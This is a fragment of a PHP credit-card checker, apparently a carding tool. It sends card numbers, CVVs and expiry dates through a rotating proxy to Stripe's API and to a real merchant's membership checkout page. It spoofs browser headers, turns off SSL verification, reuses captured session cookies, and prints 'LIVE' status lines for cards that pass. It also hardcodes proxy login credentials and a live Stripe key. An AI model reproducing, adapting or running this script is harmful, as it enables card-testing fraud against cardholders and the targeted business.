...
# -------------------- [WEBSHARE PROXY] -------------------#
$webshareuser = 'jwhoehyw-rotate';
$websharepass = 'tcu54tv5hyn8';
$webshareport = 80;
...
'user-agent: Mozilla/5.0 (Linux; Android 11; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fe3ce86186%3B+stripe-js-v3%2Fe3ce86186&time_on_page=60432&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1FfBCcJ2148IbgRg');
...
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://paintingandvino.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: paintingandvino.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'cache-control: max-age=0',
'content-type: application/x-www-form-urlencoded',
'cookie: __stripe_mid=4ea99886-63ac-4153-806d-b6fee3b9475f363981; __stripe_sid=543a23c8-eb03-4a86-bd96-35241652dea53d31b7; _pk_ses.98209.2ae8=1; _fbp=fb.1.1671632115719.2037728961; PHPSESSID=58f779408946a82a82a9bb33c5a5182a; pmpro_visit=1; _pk_id.98209.2ae8=c3150f57ee79d700.1671632115.1.1671632240.1671632115.',
'origin: https://paintingandvino.com',
'referer: https://paintingandvino.com/',
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username='.$firstname.''.$lastname.'&password='.$email.'&password2='.$email.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX3078&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
...
(strpos($result1, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ AUTHENTICATION REQUIRED TO COMPLETE THIS TRANSACTION! ⚠️";
}
